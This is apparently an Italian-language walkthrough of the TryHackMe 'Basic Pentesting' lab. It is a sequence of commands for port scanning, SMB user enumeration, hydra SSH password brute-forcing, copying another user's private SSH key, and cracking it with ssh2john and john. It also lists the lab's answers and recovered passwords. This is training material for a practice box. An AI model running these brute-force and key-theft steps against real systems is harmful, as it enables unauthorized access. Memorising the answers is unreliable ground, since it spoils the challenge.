
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/basicpentestingjt

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.242.6 -oG risultatoscan
```

```
sudo nmap -sC -sV -p22,80,139,445,8009,8080 10.10.242.6 -oN risultatoscan2
```

```
gobuster dir -u http://10.10.242.6:80 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
nmap -p 80 --script http-enum 10.10.242.6
```

```
enum4linux -a 10.10.242.6
```

trovati due utenti
```
jan
```
e
```
kay
```
oppure si possono trovare tramite
```
smbclient //10.10.242.6/anonymous
```

```
more staff.txt
```
==Qual'è username?==
```
jan
```

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.242.6 -t 4 ssh -I -F -V
```
trovata password !
==Qual è la password?==
```
armando
```

==Quale servizio utilizzi per accedere al server (risposta in forma abbreviata e scritta tutta in maiuscolo)?==
```
ssh jan@10.10.197.4
```

```
cd /home/kali/enumerazione/
```

```
scp LinEnum.sh jan@10.10.197.4:/tmp
```

```
cd /tmp
```

```
./LinEnum.sh
```

Vai su _/home/kay/.ssh/ e copia id_rsa nel computer dell'attaccante per effettuare attacchi brute force._

```
cd /home/kay/.ssh/
```

```
scp jan@10.10.197.4:"/home/kay/.ssh/id_rsa" "$HOME/Downloads"
```
	(scaricare da shell non root)
da attaccante
```
cd /home/kali/Downloads
```

```
ssh  kay@10.10.197.4 id_rsa
```
	(non va)

Attacco brute force su id_rsa tramite ssh2john

```
chmod +x id_rsa
```

trasformiamo la chiave rsa in hash e la andiamo a decriptare sempre con john==
```
ssh2john id_rsa > id_rsa.hash
```

```
john -wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

```
john --show id_rsa.hash
```

password
```
beeswax
```

```
ssh kay@10.10.197.4
```

```
sudo ssh -i id_rsa kay@10.10.197.4
```

```
cat pass.bak
```

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
